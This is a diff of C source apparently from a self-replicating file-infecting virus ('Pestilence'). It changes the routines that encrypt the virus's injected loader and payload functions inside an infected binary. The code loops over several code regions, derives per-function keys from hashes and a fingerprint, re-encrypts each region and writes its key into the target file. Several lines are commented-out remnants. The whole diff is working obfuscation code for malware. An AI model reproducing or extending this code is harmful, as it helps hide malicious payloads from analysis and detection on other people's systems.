@@ -44,10 +44,9 @@ uint32_t	hash_loader(t_info *info)
 			hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
-	uint32_t key = decrypt_func(info, &patch_loader, 0x79, get_key_func(1));
-// 	dprintf(1, "%#x\n", key);
+// 	uint32_t key = decrypt_func(info, &patch_loader, 0x79, 0);
 	patch_loader(info, hash);
-	reencrypt_func(info, &patch_loader, 0x79, key);
+// 	reencrypt_func(info, &patch_loader, 0x79, key);
 	str = (unsigned char *)(info->file + info->offset_bis);
 	size = 0x10; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
 	i = 0;
@@ -60,18 +59,23 @@ uint32_t	hash_loader(t_info *info)
 	return (hash);
 }
 
-uint32_t	decrypt_func(t_info *info, void *addr, size_t size, uint32_t key)
+uint32_t	decrypt_func(t_info *info, void *addr, size_t size, uint32_t nb_func)
 {
 	size_t		i;
 	uint32_t	*str;
+	uint32_t	key;
 	int		nb = 0;
 
+// 	dprintf(1, "%#lx\n", size);
+	if (info->in_pestilence == 1)
+		return (0);
+	key = get_key_func(nb_func);
+	key -= hash_func(addr, size, 5381);
 	size = (size >> 2) << 2;
 	str = (uint32_t *)addr;
 	size -= 4;
 	size /= 4;
-	if (info->in_pestilence == 1)
-		return (0);
+// 	key -= size;
 	while (nb < 8)
 	{
 		i = size;
@@ -118,7 +122,7 @@ uint32_t	encrypt_func(void *addr, size_t size, uint32_t key)
 	return (key);
 }
 
-uint32_t	hash_funcs(void *addr, size_t size, uint32_t hash)
+uint32_t	hash_func(void *addr, size_t size, uint32_t hash)
 {
 	unsigned char	*str;
 	size_t		i = 0;
@@ -149,25 +153,34 @@ void		save_key(t_info *info, uint32_t hash, int nb)
 	void	*addr;
 
 	addr = &get_key_func - (size_t)(&ft_memcpy);
-	addr = info->file + info->offset_bis + BIS_SIZE + (size_t)addr + 3 + (nb * 7);
+	addr = info->file + info->offset_bis + BIS_SIZE + (size_t)addr + 3 + (nb * 10);
 	ft_memcpy(addr, &hash, 4);
 }
 
 void		crypt_payload(t_info *info, uint32_t fingerprint)
 {
+// 	size_t		tab[3] = {(size_t)&patch_loader, (size_t)&patch_payload, (size_t)&patch_bis};
 	size_t		size;
 	size_t		offset;
 	uint32_t	hash;
+	int		i = 0;
 	
+	// decrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], x);
+	// reencrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], key);
 
-	size = (size_t)(&patch_payload) - (size_t)(&patch_loader);
-	offset = (size_t)(&patch_loader) - (size_t)(&ft_memcpy);
-	if (info->in_pestilence == 0)
+	while (i < 4)
 	{
-		decrypt_func(info, info->file + info->offset_bis + BIS_SIZE + offset, size, get_key_func(1));
+		size = info->tab_addr[i + 1] - info->tab_addr[i];
+		offset = info->tab_addr[i] - (size_t)(&ft_memcpy);
+		if (info->in_pestilence == 0)
+		{
+			decrypt_func(info, info->file + info->offset_bis + BIS_SIZE + offset, size, i);
+		}
+		hash = hash_func((void *)(info->tab_addr[i]), size, fingerprint);
+		hash = encrypt_func(info->file + info->offset_bis + BIS_SIZE + offset, size, hash);
+// 		hash += size;
+		hash += hash_func(info->file + info->offset_bis + BIS_SIZE + offset, size, 5381);
+		save_key(info, hash, i);
+		i++;
 	}
-	hash = hash_funcs(&patch_loader, size, fingerprint);
-	hash = encrypt_func(info->file + info->offset_bis + BIS_SIZE + offset, size, hash);
-	save_key(info, hash, 0);
-// 	dprintf(1, "%#lx\n", size);
 }
